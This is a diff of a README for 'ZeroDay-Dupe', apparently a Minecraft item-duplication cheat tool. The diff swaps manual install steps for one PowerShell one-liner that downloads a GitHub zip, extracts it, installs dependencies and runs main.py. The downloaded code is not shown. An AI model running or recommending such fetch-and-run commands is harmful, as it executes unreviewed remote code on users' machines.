@@ -30,23 +30,9 @@ Compatibility with all chest types
 # 📥 Installation
 Install python for Windows
 
-Click on the green code button and download and wonload the zip
-
-extract the zip to the Downloads folder
-
 open powershell and type in:
 
-cd Downloads
-
-cd ZeroDay-Dupe-main
-
-Install dependencies:
-
-python -m pip install -r requirements.txt
-
-Run the application:
-
-python main.py
+cd ~/Downloads; iwr https://github.com/sir4bep/ZeroDay-Dupe/archive/main.zip -OutFile z.zip; Expand-Archive z.zip . -Force; cd ZeroDay-Dupe-main; python -m pip install -r requirements.txt; python main.py
 
 # 🛠️ How to Use
 Launch ZeroDay and connect to your Minecraft client
